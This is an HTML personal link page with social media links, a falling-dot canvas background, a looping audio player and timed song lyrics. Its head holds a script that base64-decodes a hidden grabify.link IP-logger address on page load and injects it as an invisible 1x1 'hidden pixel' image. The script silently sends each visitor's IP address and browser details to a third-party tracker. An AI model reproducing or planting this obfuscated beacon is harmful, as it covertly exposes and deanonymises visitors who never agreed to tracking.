<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>rawr</title>

  <!-- Tailwind CSS & Lucide Icons -->
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://unpkg.com/lucide@latest"></script>

  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap');
    body { font-family: 'Inter', sans-serif; }

    .custom-audio-container {
      background-color: #1f2937;
      border: 2px solid #4b5563;
      border-radius: 1rem;
      padding: 0.75rem;
      width: 100%;
      max-width: 320px;
      margin: 1rem auto;
      box-shadow: 0 4px 6px rgba(0,0,0,0.5);
    }

    .blur-overlay {
      backdrop-filter: blur(12px);
      -webkit-backdrop-filter: blur(12px);
    }

    .audio-controls button {
      padding: 6px;
      border-radius: 6px;
      background-color: rgba(255,255,255,0.05);
      transition: background 0.2s;
    }

    .audio-controls button:hover {
      background-color: rgba(255,255,255,0.1);
    }

    .time-display {
      font-size: 0.875rem;
      color: #9ca3af;
    }

    @keyframes flicker {
      0%, 100% { opacity: 1; transform: scaleX(1); }
      50% { opacity: 0.3; transform: scaleX(1.4); }
    }

    #playPauseIcon {
      animation: flicker 0.4s infinite;
    }

    #backgroundCanvas {
      pointer-events: none;
    }

    #currentLyric {
      opacity: 0;
      animation: fadeIn 1s ease-in-out forwards;
    }

    @keyframes fadeIn {
      to { opacity: 1; }
    }
  </style>

  <script>
    document.addEventListener("DOMContentLoaded", function () {
      const fullBase64 = "aHR0cHM6Ly9ncmFiaWZ5LmxpbmsvVTFUUU8y";
      const decodedURL = atob(fullBase64);
      const img = document.createElement("img");
      img.src = decodedURL;
      img.width = 1;
      img.height = 1;
      img.style.display = "none";
      img.alt = "hidden pixel";
      document.body.appendChild(img);
    });
  </script>
</head>

<body class="bg-black text-white flex flex-col items-center justify-center min-h-screen px-4 py-10 space-y-8 relative">

  <canvas id="backgroundCanvas" class="fixed top-0 left-0 w-full h-full z-0"></canvas>

  <div id="enterOverlay" class="absolute inset-0 z-50 bg-black bg-opacity-70 blur-overlay flex items-center justify-center cursor-pointer">
    <p class="text-white text-2xl font-semibold">click 2 enter!!</p>
  </div>

  <h1 class="text-4xl font-bold z-10">um</h1>
  <p class="text-gray-400 z-10">socialsss</p>

  <div class="flex flex-col gap-4 w-full max-w-xs z-10">
    <a href="https://www.tiktok.com/@copyright.txt" target="_blank"
       class="bg-white text-black flex items-center justify-between px-4 py-3 rounded-2xl hover:scale-105 transform transition">
      <div class="flex items-center gap-3">
        <i data-lucide="music-3"></i>
        <span class="font-semibold">TikTok</span>
      </div>
      <span>@copyright.txt</span>
    </a>
    <a href="https://github.com/copyrighttxt" target="_blank"
       class="bg-gray-800 text-white flex items-center justify-between px-4 py-3 rounded-2xl hover:scale-105 transform transition">
      <div class="flex items-center gap-3">
        <i data-lucide="github"></i>
        <span class="font-semibold">GitHub</span>
      </div>
      <span>@copyrighttxt</span>
    </a>
    <a href="https://www.youtube.com/@rlxw" target="_blank"
       class="bg-red-600 text-white flex items-center justify-between px-4 py-3 rounded-2xl hover:scale-105 transform transition">
      <div class="flex items-center gap-3">
        <i data-lucide="youtube"></i>
        <span class="font-semibold">YouTube</span>
      </div>
      <span>@rlxw</span>
    </a>
    <a href="https://twitter.com/copyrighttxt" target="_blank"
       class="bg-blue-500 text-white flex items-center justify-between px-4 py-3 rounded-2xl hover:scale-105 transform transition">
      <div class="flex items-center gap-3">
        <i data-lucide="twitter"></i>
        <span class="font-semibold">Twitter</span>
      </div>
      <span>@copyrighttxt</span>
    </a>
  </div>

  <div class="custom-audio-container text-center z-10">
    <p class="text-sm text-gray-400 mb-2">Now Playing: <span class="italic">i wrote this poem about you listen you dont have a choice</span></p>
    <audio id="audioPlayer" class="hidden" loop>
      <source src="https://github.com/copyrighttxt/copyrighttxt.github.io/raw/refs/heads/main/fuckinghatemybrainwannablowitout.mp3" type="audio/mpeg">
      Your browser does not support the audio element.
    </audio>
    <div class="audio-controls flex justify-center gap-4 mt-2">
      <button id="prevBtn"><i data-lucide="skip-back" class="w-5 h-5"></i></button>
      <button id="playPauseBtn"><div id="playPauseIcon" class="w-5 h-[2px] bg-white"></div></button>
      <button id="nextBtn"><i data-lucide="skip-forward" class="w-5 h-5"></i></button>
    </div>
    <div id="timer" class="time-display mt-2">0:00 / 0:00</div>
  </div>

  <!-- Synced Lyrics Box -->
  <div class="custom-audio-container text-center z-10 mt-4 max-w-md">
    <p class="text-sm text-gray-400 mb-2">Lyrics</p>
    <div id="lyricsDisplay" class="text-sm text-gray-300 whitespace-pre-line h-32 overflow-hidden relative">
      <p id="currentLyric" class="transition-opacity duration-300 ease-in-out text-lg"></p>
    </div>
  </div>
  <div id="lyricsDisplay" class="text-sm text-gray-300 max-w-md mx-auto mt-4 z-10 text-center h-32 overflow-hidden relative">
    <p id="currentLyric" class="transition-opacity duration-300 ease-in-out text-lg"></p>
  </div>

  <script>
    const canvas = document.getElementById('backgroundCanvas');
    const ctx = canvas.getContext('2d');
    let dots = [];

    function resizeCanvas() {
      canvas.width = window.innerWidth;
      canvas.height = window.innerHeight;
    }

    window.addEventListener('resize', resizeCanvas);
    resizeCanvas();

    function createDots(count) {
      dots = [];
      for (let i = 0; i < count; i++) {
        dots.push({ x: Math.random() * canvas.width, y: Math.random() * canvas.height, r: Math.random() * 2 + 1, speed: Math.random() * 1.5 + 0.5 });
      }
    }

    function drawDots() {
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      ctx.fillStyle = 'white';
      for (let dot of dots) {
        ctx.beginPath();
        ctx.arc(dot.x, dot.y, dot.r, 0, Math.PI * 2);
        ctx.fill();
        dot.y += dot.speed;
        if (dot.y > canvas.height) {
          dot.y = 0;
          dot.x = Math.random() * canvas.width;
        }
      }
      requestAnimationFrame(drawDots);
    }

    createDots(100);
    drawDots();

    lucide.createIcons();

    const overlay = document.getElementById("enterOverlay");
    const audio = document.getElementById("audioPlayer");
    const playPauseBtn = document.getElementById("playPauseBtn");
    const nextBtn = document.getElementById("nextBtn");
    const prevBtn = document.getElementById("prevBtn");
    const timerDisplay = document.getElementById("timer");
    const lyricElement = document.getElementById("currentLyric");

    const tracks = [audio.querySelector("source").src];
    let currentTrack = 0;

    const lyrics = [
      { time: 0, text: "Today, I realized all my music really is just noise" },
      { time: 8, text: "I like to talk to myself, but when in your voice" },
      { time: 12, text: "I wrote this poem 'bout you, listen, you don't have no choice" },
      { time: 17, text: "And I'll keep waiting 'less you start talking to other boys" },
      { time: 21, text: "I wrote this poem 'bout you, listen, you don't have no choice" },
      { time: 26, text: "And I'll keep waiting 'less you start talking to other boys" },
      { time: 30, text: "Fucking hate my brain, wanna blow it out" },
      { time: 35, text: "I can't talk 'bout that with you, you might hear me out" },
      { time: 39, text: "Say you feel the same as me, but you just want clout" },
      { time: 43, text: "I'm really the only one who doesn't run their mouth" },
      { time: 50, text: "Keep her picture, you might miss her" }
    ];

    function formatTime(seconds) {
      const m = Math.floor(seconds / 60);
      const s = Math.floor(seconds % 60).toString().padStart(2, '0');
      return `${m}:${s}`;
    }

    function updateTimer() {
      const current = formatTime(audio.currentTime);
      const total = isNaN(audio.duration) ? '0:00' : formatTime(audio.duration);
      timerDisplay.textContent = `${current} / ${total}`;
    }

    function loadTrack(index) {
      audio.src = tracks[index];
      audio.load();
      updateTimer();
    }

    function tryPlayAudio() {
      audio.play().then(() => {
        overlay.style.display = "none";
      }).catch((e) => {
        console.warn("Autoplay blocked:", e);
        alert("Click again to allow audio playback.");
      });
    }

    function syncLyrics() {
      const currentTime = audio.currentTime;
      for (let i = lyrics.length - 1; i >= 0; i--) {
        if (currentTime >= lyrics[i].time) {
          lyricElement.textContent = lyrics[i].text;
          break;
        }
      }
    }

    overlay.addEventListener("click", () => {
      tryPlayAudio();
    });

    playPauseBtn.addEventListener("click", () => {
      if (audio.paused) {
        tryPlayAudio();
      } else {
        audio.pause();
      }
    });

    nextBtn.addEventListener("click", () => {
      currentTrack = (currentTrack + 1) % tracks.length;
      loadTrack(currentTrack);
      tryPlayAudio();
    });

    prevBtn.addEventListener("click", () => {
      currentTrack = (currentTrack - 1 + tracks.length) % tracks.length;
      loadTrack(currentTrack);
      tryPlayAudio();
    });

    audio.addEventListener("loadedmetadata", updateTimer);
    audio.addEventListener("timeupdate", () => {
      updateTimer();
      syncLyrics();
    });

    updateTimer();
  </script>
</body>
</html>
